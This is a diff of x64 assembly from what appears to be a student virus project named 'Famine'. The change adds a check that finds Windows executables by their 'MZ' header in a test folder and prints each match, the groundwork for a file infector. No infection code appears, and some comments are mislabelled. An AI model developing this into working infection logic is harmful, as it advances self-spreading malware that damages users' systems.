@@ -29,13 +29,15 @@ db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
 hello db 'Hello 64-bit world!',0ah,0
 print_decimal db 'open : %d',0ah,0
 print_ptr db 'ptr : %p',0ah,0
+print_ok_handle db 'Found good file : handle = %d and filename = [%s]',0ah,0h
 TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 
+
 ; rbp
-; 202 - 206		: number_of_bytes_read
-; 200 - 202		:  Buffer
-; 64 - 200		: ofstruct
+; 70 - 80		: padding
+; 66 - 70		: number_of_bytes_read
+; 64 - 66		:  Buffer
 ; 32 - 64		: params
 ; 00 - 32		: shadow
 ; rsp
@@ -43,7 +45,7 @@ TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 open_file proc ; char *file_path - return fd or 0
 	push rbp
 	mov rbp, rsp
-	sub rsp, 320
+	sub rsp, 80
 	
 	xor rax, rax
 
@@ -63,23 +65,31 @@ open_file proc ; char *file_path - return fd or 0
 	mov rax, 0
 	mov [rsp + 40], rax ; no attribute template
 	call CreateFileA
-
-	cmp rax, -1
-	je ret_ret
-
+	
 	mov r12, rax
 
-	mov rcx, r12
-	lea rdx, [rsp + 200]
-	mov r8, 2
-	lea r9, [rsp + 202]
-	push 0
-	push 0
-	call ReadFile
-	add rsp, 16
+	cmp rax, -1
+	je ret_error
 
-ret_ret:
+
+	mov rcx, r12
+	lea rdx, [rsp + 64]
+	mov r8, 2
+	lea r9, [rsp + 66]
+	mov rax, 0
+	mov [rsp + 32], rax ; Open only if exists
+	mov rax, 0
+	mov [rsp + 36], rax ; flag normal
+	call ReadFile
+
+	mov ax, word ptr [rsp + 64]
+	cmp ax, 5a4dh
+	je  ret_ok
+
+ret_error:
+	mov r12, -1
 	call print_last_error
+ret_ok:
 	mov rax, r12
 	mov rsp, rbp
 	pop rbp
@@ -130,8 +140,13 @@ loop_start:
 		lea rcx, [rsp + 400]
 		call open_file
 
-		lea rcx, [rsp + 400]
-		call puts
+		cmp rax, -1
+		je loop_start
+
+		lea rcx, print_ok_handle
+		mov rdx, rax
+		lea r8, [rsp + 400]
+		call printf
 
 		jmp loop_start
 loop_end:
